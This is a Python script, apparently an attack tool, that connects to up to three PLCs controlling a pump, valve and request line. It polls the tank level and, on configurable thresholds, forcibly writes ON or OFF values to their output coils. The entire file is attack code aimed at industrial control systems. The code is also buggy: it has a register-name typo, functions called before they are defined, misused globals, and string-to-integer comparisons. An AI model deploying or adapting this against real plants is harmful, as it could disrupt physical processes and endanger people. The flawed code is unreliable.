#!/usr/bin/env python3

import configparser

def attack(ctx):    
    """
    INFO
    input_register -> %IW0 (pump level)
    pump -> %QX0.0
    valve -> %QX0.1
    request -> %QX0.2
    """

    print("File opened!")
    # Read from config.ini
    config = configparser.ConfigParser()
    config.read('config.ini')

    # Allocate all registers and coils
    # PLC 1
    plc_1_input_register = ctx.register('plc1', 'I', 0)
    plc_1_coil_register_pump = ctx.register('plc1', 'C', 0)
    plc_1_coil_register_valve = ctx.register('plc1', 'C', 1)
    plc_1_coil_register_request = ctx.register('plc1', 'C', 2)

    # PLC2
    plc_2_input_register = ctx.register('plc2', 'I', 0)
    plc_2_coil_register_pump = ctx.register('plc', 'C', 0)
    plc_2_coil_register_valve = ctx.register('plc2', 'C', 1)
    plc_2_coil_register_request = ctx.register('plc2', 'C', 2)

    # PLC3
    plc_3_input_register = ctx.register('plc3', 'I', 0)
    plc_3_coil_register_pump = ctx.register('plc3', 'C', 0)
    plc_3_coil_register_valve = ctx.register('plc3', 'C', 1)
    plc_3_coil_register_request = ctx.register('plc3', 'C', 2)


    # Allocate packets params
    pckt_number = config.get('params', 'packets_number')
    pckt_value = int(config.get('params', 'packets_value'))

    # Allocate trigger params (if present)
    coil_1_sup_limit = config.get('params', 'coil1_sup_limit')
    coil_1_inf_limit = config.get('params', 'coil1_inf_limit')
    coil_2_sup_limit = config.get('params', 'coil2_sup_limit')
    coil_2_inf_limit = config.get('params', 'coil2_inf_limit')
    coil_3_sup_limit = config.get('params', 'coil3_sup_limit')
    coil_3_inf_limit = config.get('params', 'coil3_inf_limit')


    # PLC attack
    # ONE PLC selected
    if config.get('plc', 'plc1') != "" and config.get('plc', 'plc2') == "none" and config.get('plc', 'plc3') == "none":
        print("Attacking one plc...")
        plc_1_input_register.start_polling(500, on_level_change_plc1)

    # TWO PLCs selected
    if config.get('plc', 'plc1') != "" and (config.get('plc', 'plc2') != "none" or config.get('plc', 'plc3') != "none"):
        print("Attacking two plcs...")

    # THREE PLCs selected 
    if config.get('plc', 'plc1') != "" and config.get('plc', 'plc2') != "none" and config.get('plc', 'plc3') != "none":
        print("Attacking three plcs...")


    def on_level_change_plc1(value: int):
        global pckt_number, pckt_value
        if(pckt_number == "loop"): 
            while True:
                print('PLC 1 level value', value)
                if checkTrigger():
                    # Trigger checked
                    print("Evaluating trigger options...")
                    global coil_1_sup_limit, coil_1_inf_limit

                    if(coil_1_sup_limit == "" and coil_1_inf_limit == ""): # No limits
                        print("No limits!")   
                    elif(coil_1_sup_limit != "" and coil_1_inf_limit == ""): # Only sup limit
                        if(value > coil_1_sup_limit):
                            trigger_operation_plc1(pckt_value)
                        else:
                            print("Waiting for triggers...")

                    elif(coil_1_sup_limit == "" and coil_1_inf_limit != ""): # Only inf limit
                        if(value < coil_1_inf_limit):
                            trigger_operation_plc1(pckt_value)
                        else:
                            print("Waiting for triggers...")

                    elif(coil_1_sup_limit != "" and coil_1_inf_limit != ""): # Both limits
                        if(value < coil_1_sup_limit and value > coil_1_inf_limit):
                            trigger_operation_plc1(pckt_value)
                        else:
                            print("Waiting for triggers...")


                else:
                    # Trigger unchecked - only main conditions
                    print("Starting attack on PLC1...")
                    trigger_operation_plc1(pckt_value)

        else:
            # Pckt number != loop
            for _ in pckt_number:
                print('PLC 1 level value', value)
                if checkTrigger():
                    # Trigger checked
                    print("Evaluating trigger options...")
                    global coil_1_sup_limit, coil_1_inf_limit

                    if(coil_1_sup_limit == "" and coil_1_inf_limit == ""): # No limits
                        print("No limits!")   
                    elif(coil_1_sup_limit != "" and coil_1_inf_limit == ""): # Only sup limit
                        if(value > coil_1_sup_limit):
                            trigger_operation_plc1(pckt_value)
                        else:
                            print("Waiting for triggers...")

                    elif(coil_1_sup_limit == "" and coil_1_inf_limit != ""): # Only inf limit
                        if(value < coil_1_inf_limit):
                            trigger_operation_plc1(pckt_value)
                        else:
                            print("Waiting for triggers...")

                    elif(coil_1_sup_limit != "" and coil_1_inf_limit != ""): # Both limits
                        if(value < coil_1_sup_limit and value > coil_1_inf_limit):
                            trigger_operation_plc1(pckt_value)
                        else:
                            print("Waiting for triggers...")


                else:
                    # Trigger unchecked - only main conditions
                    print("Starting attack on PLC1...")
                    trigger_operation_plc1(pckt_value)
    

    def checkTrigger():
        global coil_1_sup_limit, coil_1_inf_limit
        global coil_2_sup_limit, coil_2_inf_limit
        global coil_3_sup_limit, coil_3_inf_limit

        if(coil_1_sup_limit == "" and coil_1_inf_limit == "" and coil_2_sup_limit == "" and coil_2_inf_limit == ""
            and coil_3_sup_limit =="" and coil_3_inf_limit == ""):
            return False # No triggers

        return True
    
    def trigger_operation_plc1(p_val):
        if  int(config.get('params', 'coil1')) == 1:
            plc_1_coil_register_pump.write(int(pckt_value))
            print ("Writing on %QX0.0 - pump - PLC 1 ")

        if int(config.get('params', 'coil2')) == 1:
            plc_1_coil_register_valve.write(int(pckt_value))
            print ("Writing on %QX0.0 - register - PLC 1 ")

        if int(config.get('params', 'coil3')) == 1:
            plc_1_coil_register_request.write(int(pckt_value))
            print ("Writing on %QX0.0 - request - PLC 1 ")
        
        if(pckt_value == 0):
            print('COMMAND OFF - Value wrote: ', pckt_value)
        elif(pckt_value == 1):
            print('COMMAND ON - Value wrote: ', pckt_value)




